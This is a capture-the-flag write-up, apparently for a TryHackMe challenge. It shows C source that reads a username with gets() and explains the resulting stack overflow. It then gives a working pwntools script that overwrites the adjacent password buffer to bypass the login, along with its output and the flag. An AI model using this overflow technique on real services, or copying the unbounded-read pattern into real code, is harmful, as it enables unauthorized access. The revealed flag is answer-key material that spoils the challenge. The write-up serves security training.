# CONTEXT
---


Cipher asked me to create the most secure vault for flags, so I created a vault that cannot be accessed. You don't believe me? Well, here is the code with the password hardcoded. Not that you can do much with it anymore.

**Note:** To start the target machine, click the Start Machine button:

You can use the following command to connect to the machine:

`nc 10.10.61.110 1337`

Download the source code from [here](https://drive.google.com/file/d/1kYIR2JEfLfbzifHgpGBj2xuBgGxNLp46/view?usp=sharing).

This challenge was originally a part of the Hackfinity Battle 2025 CTF Event.


Let's begin.


# EXPLOITATION
---

So, we know there's a binary running on port `1337`, let's use netcat to interact with it:

```
nc 10.10.61.110 1337
  ______ _          __      __         _ _
 |  ____| |         \ \    / /        | | |
 | |__  | | __ _  __ \ \  / /_ _ _   _| | |_
 |  __| | |/ _` |/ _` \ \/ / _` | | | | | __|
 | |    | | (_| | (_| |\  / (_| | |_| | | |_
 |_|    |_|\__,_|\__, | \/ \__,_|\__,_|_|\__|
                  __/ |
                 |___/

Version 1.0 - Passwordless authentication evolved!
==================================================================

Username: test
Wrong password! No flag for you.
```

As seen, it seems to be asking for a password, luckily for us, we got the source code of the file:

```c
#include <stdio.h>
#include <string.h>

void print_banner(){
	printf( "  ______ _          __      __         _ _   \n"
 		" |  ____| |         \\ \\    / /        | | |  \n"
		" | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
		" |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
		" | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
		" |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
		"                  __/ |                      \n"
		"                 |___/                       \n"
		"                                             \n"
		"Version 1.0 - Passwordless authentication evolved!\n"
		"==================================================================\n\n"
	      );
}

void print_flag(){
	FILE *f = fopen("flag.txt","r");
	char flag[200];

	fgets(flag, 199, f);
	printf("%s", flag);
}

void login(){
	char password[100] = "";
	char username[100] = "";

	printf("Username: ");
	gets(username);

	// If I disable the password, nobody will get in.
	//printf("Password: ");
	//gets(password);

	if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
		print_flag();
	}
	else{
		printf("Wrong password! No flag for you.");
	}
}

void main(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	// Start login process
	print_banner();
	login();

	return;
}
```

This binary is vulnerable to `Buffer Overflow`:

1. **Buffer Overflow in `username`**:
    - The `gets(username)` function reads input without bounds checking, allowing overflow into adjacent memory.
    - The `password` buffer (initialized as empty) is adjacent to `username` on the stack. Overflowing `username` can overwrite `password`.
        
2. **Stack Layout**:
    - `password[100]` is allocated first (lower memory address).
    - `username[100]` is allocated next (higher memory address).
    - Writing beyond 100 bytes in `username` overflows into `password`.
        
3. **Login Bypass**:
    - The login check requires:
        - `username == "bytereaper"`
        - `password == "5up3rP4zz123Byte"`.
    - By crafting a payload that sets `username` to `"bytereaper"` (with proper null termination) and overflows into `password` with the correct value, we can satisfy both conditions.


Knowing all that, we can use this python script:

```python
#!/usr/bin/env python3
from pwn import *
import re

def main():
    # Remote host and port (updated for this target)
    host = "10.10.61.110"
    port = 1337

    # Enable pwntools logging so we see:
    # [+] Opening connection to 10.10.61.110 on port 1337: Done
    # [+] Receiving all data: Done (XXB)
    # [*] Closed connection to 10.10.61.110 port 1337
    context.log_level = "info"

    # 1) Connect to the remote service
    conn = remote(host, port)

    # 2) Build the payload
    #    - "bytereaper\x00" makes strcmp(username, "bytereaper") succeed
    #    - 101 "A" bytes overflow into the password buffer
    #    - "5up3rP4zz123Byte" is the hardcoded password the program expects
    payload = (
        b"bytereaper\x00"       # username + null terminator
        + b"A" * 101            # overflow filler up to password check
        + b"5up3rP4zz123Byte"   # correct password string
    )

    # 3) Wait until the remote binary prompts "Username:"
    conn.recvuntil(b"Username:")

    # 4) Send the payload (pwntools will automatically append "\n")
    conn.sendline(payload)

    # 5) Read everything the server sends back (banner + flag or error)
    #    We give a small timeout to avoid hanging indefinitely
    response = conn.recvall(timeout=2).decode(errors="ignore")

    # 6) Close the connection
    conn.close()

    # 7) Extract the flag from the response.
    #    The flag is expected to match THM{â€¦}, so we search with a regex.
    match = re.search(r"THM\{.*?\}", response)
    if match:
        # Print only the flag, prefixed so it's clear in the output
        print(f"Flag: {match.group(0)}")
    else:
        # If no flag was found, print the full response for debugging
        print("No flag found. Full response:\n")
        print(response)

if __name__ == "__main__":
    main()
```

Once we run the script, we get:

```python
python3 exploit.py
[+] Opening connection to 10.10.61.110 on port 1337: Done
[+] Receiving all data: Done (24B)
[*] Closed connection to 10.10.61.110 port 1337
Flag: THM{password_0v3rfl0w}
```

Got our flag:

```python
THM{password_0v3rfl0w}
```

![Pasted image 20250605184529.png](../../IMAGES/Pasted%20image%2020250605184529.png)

